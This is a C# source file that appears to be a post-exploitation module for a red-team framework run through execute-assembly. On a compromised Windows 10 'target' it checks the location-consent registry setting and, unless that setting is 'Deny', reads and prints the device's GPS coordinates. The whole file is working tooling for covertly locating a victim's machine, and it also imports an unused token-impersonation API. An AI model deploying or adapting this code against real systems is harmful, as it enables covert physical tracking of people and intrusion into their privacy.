using System;
using Microsoft.Win32;
using System.Device.Location;
using System.IO;
using System.Runtime.InteropServices;

namespace GPSCoordinates
{
    class Program
    {
[DllImport("shell32.dll", SetLastError = true)]
static extern IntPtr CommandLineToArgvW([MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs);

[DllImport("advapi32.dll", SetLastError = true)]
static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

public static string[] CommandLineToArgs(string commandLine)
{
    int argc;
    var argv = CommandLineToArgvW(commandLine, out argc);
    if (argv == IntPtr.Zero)
        throw new System.ComponentModel.Win32Exception();
    try
    {
        var args = new string[argc];
        for (var i = 0; i < args.Length; i++)
        {
            var p = Marshal.ReadIntPtr(argv, i * IntPtr.Size);
            args[i] = Marshal.PtrToStringUni(p);
        }

        return args;
    }
    finally
    {
        Marshal.FreeHGlobal(argv);
    }
}

public static string Execute(string commandLine)
{
    var sw = new StringWriter();
    Console.SetOut(sw);
    Console.SetError(sw);

    try
    {
        Main(CommandLineToArgs(commandLine));
    }
    catch (Exception e)
    {
        return e.ToString();
    }

    return sw.ToString();
}

        static void Main(string[] args)
        {
            RegistryKey osVerKey = Registry.LocalMachine;
            RegistryKey osVerSubKey = osVerKey.OpenSubKey(@"SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion");
            string osVer = osVerSubKey.GetValue("ProductName").ToString();
            if (!osVer.Contains("Windows 10"))
            {
                Console.WriteLine("[-] Target does not appear to be Windows 10. Exiting.");
                return;
            }

            Location currentLoc = new Location();        

            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location");
            if (key.GetValue("Value").Equals("Deny"))
            {
                Console.WriteLine("[-] Location Services registry key set to 'Deny'");
                return;
            }
            else
            {
                currentLoc.GetLocationEvent();
                Console.WriteLine("Hit any key to exit"); //This will likely cause problems with execute-assembly
                Console.ReadKey();
            }
        }

        class Location
        {
            GeoCoordinateWatcher tracker;

            public void GetLocationEvent()
            {
                tracker = new GeoCoordinateWatcher();
                
                tracker.PositionChanged += new EventHandler<GeoPositionChangedEventArgs<GeoCoordinate>>(coordinateCollect);
                bool tryStart = tracker.TryStart(false, TimeSpan.FromMilliseconds(1000));
                if (!tryStart)
                {
                    Console.WriteLine("[-] Coordinate collector timed out");
                }
                
            }

            void coordinateCollect(object sender, GeoPositionChangedEventArgs<GeoCoordinate> e)
            {
                PrintPosition(e.Position.Location.Latitude, e.Position.Location.Longitude);
            }

            void PrintPosition(double Latitude, double Longitude)
            {
                Console.WriteLine("{0},{1}", Latitude, Longitude);
            }
        }
    }
}
